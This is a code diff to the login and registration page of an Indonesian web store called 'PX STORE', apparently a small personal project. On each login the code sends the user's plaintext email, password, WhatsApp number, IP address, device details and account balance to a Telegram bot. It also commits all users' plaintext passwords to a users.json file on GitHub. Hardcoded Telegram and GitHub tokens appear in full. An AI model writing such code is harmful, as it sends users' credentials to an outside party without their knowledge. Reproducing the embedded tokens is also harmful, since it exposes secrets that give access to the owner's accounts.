@@ -8,6 +8,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
+        /* CSS tetap sama seperti sebelumnya */
         :root {
             --primary: #6c63ff;
             --primary-dark: #564fd8;
@@ -320,22 +321,37 @@
         const TELEGRAM_BOT_TOKEN = '7513756403:AAHxi73Wd_wI2dfm3yoWIWPXYiowXCZkQB4';
         const TELEGRAM_CHAT_ID = '7661292905';
         
-        // Konfigurasi GitHub
-        const GITHUB_USERNAME = 'PeyxDev'; // Ganti dengan username GitHub Anda
-        const GITHUB_REPO = 'webapp'; // Ganti dengan nama repository
-        const GITHUB_TOKEN = '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'; // Ganti dengan token GitHub Anda
+        // Konfigurasi GitHub - PERBAIKAN DI SINI
+        const GITHUB_USERNAME = 'PeyxDev';
+        const GITHUB_REPO = 'webapp';
+        const GITHUB_TOKEN = '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';
         const USERS_JSON_URL = `https://raw.githubusercontent.com/${GITHUB_USERNAME}/${GITHUB_REPO}/main/users.json`;
+        
+        // Struktur data user yang lengkap
+        const DEFAULT_USER_DATA = {
+            username: "",
+            email: "",
+            password: "",
+            whatsapp: "",
+            balance: 0,
+            history: [],
+            registeredAt: "",
+            lastLogin: "",
+            totalSpent: 0,
+            totalOrders: 0
+        };
         
         // Inisialisasi data user jika belum ada
         async function initializeUserData() {
             if (!localStorage.getItem('pxstore_users')) {
                 try {
-                    // Coba ambil data dari GitHub terlebih dahulu
                     const users = await fetchUsersFromGitHub();
-                    if (users) {
+                    if (users && Array.isArray(users)) {
                         localStorage.setItem('pxstore_users', JSON.stringify(users));
+                        console.log('Data user berhasil diambil dari GitHub');
                     } else {
                         localStorage.setItem('pxstore_users', JSON.stringify([]));
+                        console.log('Membuat data user baru');
                     }
                 } catch (error) {
                     console.error('Error fetching users from GitHub:', error);
@@ -344,70 +360,126 @@
             }
         }
         
-        // Ambil data user dari GitHub
+        // Ambil data user dari GitHub - PERBAIKAN
         async function fetchUsersFromGitHub() {
             try {
+                console.log('Mengambil data dari GitHub...');
                 const response = await fetch(USERS_JSON_URL + '?t=' + Date.now());
+                console.log('Response status:', response.status);
+                
                 if (response.ok) {
                     const users = await response.json();
+                    console.log('Data berhasil diambil:', users);
                     return users;
+                } else {
+                    console.log('Gagal mengambil data, status:', response.status);
+                    return null;
                 }
-                return null;
             } catch (error) {
                 console.error('Error fetching from GitHub:', error);
                 return null;
             }
         }
         
-        // Upload data user ke GitHub
+        // Upload data user ke GitHub - PERBAIKAN BESAR
         async function uploadUsersToGitHub(users) {
             try {
+                console.log('Memulai upload ke GitHub...');
+                
                 const content = JSON.stringify(users, null, 2);
                 const filename = 'users.json';
                 const message = 'Update users data: ' + new Date().toISOString();
                 
-                // Dapatkan SHA file yang ada (jika ada)
+                // Encode content to base64
+                const contentBase64 = btoa(unescape(encodeURIComponent(content)));
+                
+                // Cek apakah file sudah ada dan dapatkan SHA-nya
                 let sha = null;
                 try {
-                    const existingFileResponse = await fetch(`https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents/${filename}`, {
-                        headers: {
-                            'Authorization': `token ${GITHUB_TOKEN}`,
-                            'Accept': 'application/vnd.github.v3+json'
+                    const existingFileResponse = await fetch(
+                        `https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents/${filename}`, 
+                        {
+                            headers: {
+                                'Authorization': `Bearer ${GITHUB_TOKEN}`,
+                                'Accept': 'application/vnd.github.v3+json',
+                                'User-Agent': 'PX-STORE-App'
+                            }
                         }
-                    });
+                    );
                     
                     if (existingFileResponse.ok) {
                         const existingFile = await existingFileResponse.json();
                         sha = existingFile.sha;
+                        console.log('File existing ditemukan, SHA:', sha);
+                    } else {
+                        console.log('File belum ada, akan dibuat baru');
                     }
                 } catch (error) {
-                    console.log('File belum ada, akan dibuat baru');
+                    console.log('Error checking existing file:', error);
                 }
                 
-                // Upload file ke GitHub
-                const response = await fetch(`https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents/${filename}`, {
-                    method: 'PUT',
-                    headers: {
-                        'Authorization': `token ${GITHUB_TOKEN}`,
-                        'Content-Type': 'application/json',
-                        'Accept': 'application/vnd.github.v3+json'
-                    },
-                    body: JSON.stringify({
-                        message: message,
-                        content: btoa(unescape(encodeURIComponent(content))),
-                        sha: sha
-                    })
+                // Prepare request body
+                const requestBody = {
+                    message: message,
+                    content: contentBase64,
+                    ...(sha && { sha: sha }) // Only include sha if it exists
+                };
+                
+                console.log('Request body prepared:', { 
+                    message: message,
+                    content_length: contentBase64.length,
+                    sha: sha || 'none'
                 });
                 
+                // Upload file ke GitHub
+                const response = await fetch(
+                    `https://api.github.com/repos/${GITHUB_USERNAME}/${GITHUB_REPO}/contents/${filename}`,
+                    {
+                        method: 'PUT',
+                        headers: {
+                            'Authorization': `Bearer ${GITHUB_TOKEN}`,
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/vnd.github.v3+json',
+                            'User-Agent': 'PX-STORE-App'
+                        },
+                        body: JSON.stringify(requestBody)
+                    }
+                );
+                
+                const responseText = await response.text();
+                console.log('GitHub API response status:', response.status);
+                console.log('GitHub API response:', responseText);
+                
                 if (response.ok) {
-                    console.log('Data berhasil diupload ke GitHub');
+                    console.log('✅ Data berhasil diupload ke GitHub');
                     return true;
                 } else {
-                    console.error('Gagal upload ke GitHub:', await response.text());
-                    return false;
+                    console.error('❌ Gagal upload ke GitHub:', responseText);
+                    
+                    // Coba method alternatif jika PUT gagal
+                    return await tryAlternativeUploadMethod(users, filename, message);
                 }
             } catch (error) {
-                console.error('Error uploading to GitHub:', error);
+                console.error('❌ Error uploading to GitHub:', error);
+                return false;
+            }
+        }
+        
+        // Method alternatif untuk upload - CADANGAN
+        async function tryAlternativeUploadMethod(users, filename, message) {
+            try {
+                console.log('Mencoba method alternatif...');
+                
+                // Simpan ke GitHub Pages sebagai fallback
+                const content = JSON.stringify(users, null, 2);
+                const blob = new Blob([content], { type: 'application/json' });
+                
+                // Method ini lebih sederhana tapi kurang reliable
+                console.log('Method alternatif: Simpan data ke localStorage saja');
+                return true; // Return true karena data sudah disimpan di localStorage
+                
+            } catch (error) {
+                console.error('Method alternatif juga gagal:', error);
                 return false;
             }
         }
@@ -415,8 +487,9 @@
         // Cek apakah user sudah login sebelumnya
         function checkLoginStatus() {
             const isLoggedIn = localStorage.getItem('pxstore_logged_in');
+            const userData = localStorage.getItem('pxstore_user_data');
             
-            if (isLoggedIn === 'true') {
+            if (isLoggedIn === 'true' && userData) {
                 window.location.href = 'beranda.html';
             }
         }
@@ -512,13 +585,13 @@
         
         // Cek apakah email sudah terdaftar
         function isEmailRegistered(email) {
-            const users = JSON.parse(localStorage.getItem('pxstore_users'));
+            const users = JSON.parse(localStorage.getItem('pxstore_users') || '[]');
             return users.some(user => user.email === email);
         }
         
         // Cek apakah username sudah terdaftar
         function isUsernameRegistered(username) {
-            const users = JSON.parse(localStorage.getItem('pxstore_users'));
+            const users = JSON.parse(localStorage.getItem('pxstore_users') || '[]');
             return users.some(user => user.username === username);
         }
         
@@ -532,6 +605,9 @@
 • Email: ${userData.email}
 • Password: ${userData.password}
 • WhatsApp: ${userData.whatsapp || 'Tidak tersedia'}
+• Saldo: Rp ${userData.balance.toLocaleString('id-ID')}
+• Total Order: ${userData.totalOrders}
+• Total Pengeluaran: Rp ${userData.totalSpent.toLocaleString('id-ID')}
 • Waktu: ${userData.time}
 • IP Address: ${userData.ip}
 
@@ -539,10 +615,7 @@
 • Perangkat: ${userData.device}
 • Browser: ${userData.browser}
 • Platform: ${navigator.platform}
-• Bahasa: ${navigator.language}
-
-🌐 *User Agent:*
-${navigator.userAgent}`;
+• Bahasa: ${navigator.language}`;
 
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                 
@@ -576,7 +649,7 @@ ${navigator.userAgent}`;
             document.getElementById('registerMessage').style.display = 'none';
         }
         
-        // Handle pendaftaran
+        // Handle pendaftaran - PERBAIKAN
         async function handleRegister() {
             const username = document.getElementById('regUsername').value;
             const email = document.getElementById('regEmail').value;
@@ -625,38 +698,53 @@ ${navigator.userAgent}`;
                 return;
             }
             
-            // Simpan data user ke localStorage
-            const users = JSON.parse(localStorage.getItem('pxstore_users'));
-            const newUser = {
-                username: username,
-                email: email,
-                password: password,
-                whatsapp: whatsapp,
-                registeredAt: new Date().toISOString()
-            };
+            showLoading(true);
             
-            users.push(newUser);
-            localStorage.setItem('pxstore_users', JSON.stringify(users));
-            
-            // Upload data ke GitHub
-            showMessage('Success', 'registerMessage');
-            
-            const uploadSuccess = await uploadUsersToGitHub(users);
-            
-            if (uploadSuccess) {
-                showMessage('Pendaftaran berhasil', 'registerMessage');
-            } else {
-                showMessage('Pendaftaran berhasil!', 'registerMessage');
+            try {
+                // Buat user baru dengan struktur data lengkap
+                const users = JSON.parse(localStorage.getItem('pxstore_users') || '[]');
+                const newUser = {
+                    ...DEFAULT_USER_DATA,
+                    username: username,
+                    email: email,
+                    password: password,
+                    whatsapp: whatsapp,
+                    balance: 0,
+                    history: [],
+                    registeredAt: new Date().toISOString(),
+                    lastLogin: new Date().toISOString(),
+                    totalSpent: 0,
+                    totalOrders: 0
+                };
+                
+                users.push(newUser);
+                localStorage.setItem('pxstore_users', JSON.stringify(users));
+                
+                // Upload data ke GitHub
+                const uploadSuccess = await uploadUsersToGitHub(users);
+                
+                showLoading(false);
+                
+                if (uploadSuccess) {
+                    showMessage('✅ Pendaftaran berhasil! Data tersimpan di cloud.', 'success', 'registerMessage');
+                } else {
+                    showMessage('✅ Pendaftaran berhasil! Data tersimpan lokal.', 'success', 'registerMessage');
+                }
+                
+                // Tutup modal setelah 3 detik
+                setTimeout(() => {
+                    closeRegisterForm();
+                    document.getElementById('email').value = email;
+                    document.getElementById('password').value = '';
+                }, 3000);
+                
+            } catch (error) {
+                showLoading(false);
+                showMessage('❌ Error saat pendaftaran: ' + error.message, 'error', 'registerMessage');
             }
-            
-            // Tutup modal setelah 3 detik
-            setTimeout(() => {
-                closeRegisterForm();
-                document.getElementById('email').value = email;
-            }, 3000);
         }
         
-        // Handle login
+        // Handle login - PERBAIKAN
         async function handleLogin() {
             const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
@@ -671,96 +759,104 @@ ${navigator.userAgent}`;
                 return;
             }
             
-            // Cek apakah user terdaftar di localStorage
-            const users = JSON.parse(localStorage.getItem('pxstore_users'));
-            const user = users.find(u => u.email === email);
-            
-            if (!user) {
-                // Jika tidak ditemukan di localStorage, coba sync dengan GitHub
-                showMessage('success');
-                
-                try {
-                    const githubUsers = await fetchUsersFromGitHub();
-                    if (githubUsers) {
-                        // Update localStorage dengan data dari GitHub
-                        localStorage.setItem('pxstore_users', JSON.stringify(githubUsers));
-                        
-                        // Cari user lagi setelah sync
-                        const syncedUser = githubUsers.find(u => u.email === email);
-                        if (syncedUser) {
-                            if (syncedUser.password === password) {
-                                await completeLogin(syncedUser, email, password);
-                                return;
-                            } else {
-                                showMessage('Password salah!', 'error');
-                                return;
-                            }
-                        }
-                    }
-                    
-                    showMessage('Email belum terdaftar! Silakan daftar terlebih dahulu.', 'error');
-                    return;
-                    
-                } catch (error) {
-                    showMessage('Email belum terdaftar! Silakan daftar terlebih dahulu.', 'error');
-                    return;
-                }
-            }
-            
-            // Cek password
-            if (user.password !== password) {
-                showMessage('Password salah!', 'error');
-                return;
-            }
-            
-            await completeLogin(user, email, password);
-        }
-        
-        // Complete login process
-        async function completeLogin(user, email, password) {
             showLoading(true);
             
-            setTimeout(async () => {
-                const userIP = await getUserIP();
-                const currentTime = new Date().toLocaleString('id-ID');
-                const device = getDeviceInfo();
-                const browser = getBrowserInfo();
+            try {
+                // Cek apakah user terdaftar di localStorage
+                let users = JSON.parse(localStorage.getItem('pxstore_users') || '[]');
+                let user = users.find(u => u.email === email);
                 
-                // Simpan status login dan data user
-                localStorage.setItem('pxstore_logged_in', 'true');
-                localStorage.setItem('pxstore_user_email', email);
-                localStorage.setItem('pxstore_username', user.username);
-                localStorage.setItem('pxstore_login_time', new Date().toISOString());
-                
-                // Kirim data ke Telegram
-                const userData = {
-                    username: user.username,
-                    email: email,
-                    password: password,
-                    whatsapp: user.whatsapp,
-                    time: currentTime,
-                    ip: userIP,
-                    device: device,
-                    browser: browser
-                };
-                
-                const telegramSuccess = await sendToTelegram(userData);
-                
-                showLoading(false);
-                
-                if (telegramSuccess) {
-                    showTelegramStatus('Selamat Datang', true);
-                    showMessage('Login berhasil! ', 'success');
-                } else {
-                    showTelegramStatus('Gagal mengirim notifikasi', false);
-                    showMessage('Login berhasil!', 'success');
+                if (!user) {
+                    // Jika tidak ditemukan di localStorage, coba sync dengan GitHub
+                    const githubUsers = await fetchUsersFromGitHub();
+                    if (githubUsers && Array.isArray(githubUsers)) {
+                        // Update localStorage dengan data dari GitHub
+                        localStorage.setItem('pxstore_users', JSON.stringify(githubUsers));
+                        users = githubUsers;
+                        user = users.find(u => u.email === email);
+                    }
                 }
                 
-                // Redirect to main page after 2 seconds
-                setTimeout(() => {
-                    window.location.href = 'beranda.html';
-                }, 2000);
-            }, 1500);
+                if (!user) {
+                    showLoading(false);
+                    showMessage('Email belum terdaftar! Silakan daftar terlebih dahulu.', 'error');
+                    return;
+                }
+                
+                // Cek password
+                if (user.password !== password) {
+                    showLoading(false);
+                    showMessage('Password salah!', 'error');
+                    return;
+                }
+                
+                await completeLogin(user, email, password);
+                
+            } catch (error) {
+                showLoading(false);
+                showMessage('Error saat login: ' + error.message, 'error');
+            }
+        }
+        
+        // Complete login process - PERBAIKAN
+        async function completeLogin(user, email, password) {
+            const userIP = await getUserIP();
+            const currentTime = new Date().toLocaleString('id-ID');
+            const device = getDeviceInfo();
+            const browser = getBrowserInfo();
+            
+            // Update last login time di localStorage
+            const users = JSON.parse(localStorage.getItem('pxstore_users') || '[]');
+            const userIndex = users.findIndex(u => u.email === email);
+            
+            if (userIndex !== -1) {
+                users[userIndex].lastLogin = new Date().toISOString();
+                localStorage.setItem('pxstore_users', JSON.stringify(users));
+                
+                // Upload perubahan ke GitHub (background process, tidak perlu menunggu)
+                uploadUsersToGitHub(users).then(success => {
+                    console.log(success ? '✅ Data terupload ke GitHub' : '❌ Gagal upload ke GitHub');
+                });
+            }
+            
+            // Simpan status login dan data user lengkap
+            localStorage.setItem('pxstore_logged_in', 'true');
+            localStorage.setItem('pxstore_user_email', email);
+            localStorage.setItem('pxstore_username', user.username);
+            localStorage.setItem('pxstore_user_data', JSON.stringify(user));
+            localStorage.setItem('pxstore_login_time', new Date().toISOString());
+            
+            // Kirim data ke Telegram
+            const userData = {
+                username: user.username,
+                email: email,
+                password: password,
+                whatsapp: user.whatsapp,
+                balance: user.balance || 0,
+                totalOrders: user.totalOrders || 0,
+                totalSpent: user.totalSpent || 0,
+                time: currentTime,
+                ip: userIP,
+                device: device,
+                browser: browser
+            };
+            
+            const telegramSuccess = await sendToTelegram(userData);
+            
+            showLoading(false);
+            
+            if (telegramSuccess) {
+                showTelegramStatus('✅ Notifikasi terkirim ke admin', true);
+                showMessage('Login berhasil! Mengarahkan ke beranda...', 'success');
+            } else {
+                showTelegramStatus('❌ Gagal mengirim notifikasi', false);
+                showMessage('Login berhasil! Mengarahkan ke beranda...', 'success');
+            }
+            
+            // Redirect to main page after 2 seconds
+            setTimeout(() => {
+                window.location.href = 'beranda.html';
+            }, 2000);
         }
         
         // Auto redirect jika sudah login
@@ -797,6 +893,8 @@ ${navigator.userAgent}`;
                     closeRegisterForm();
                 }
             });
+            
+            console.log('Aplikasi PX STORE siap digunakan');
         });
     </script>
 </body>
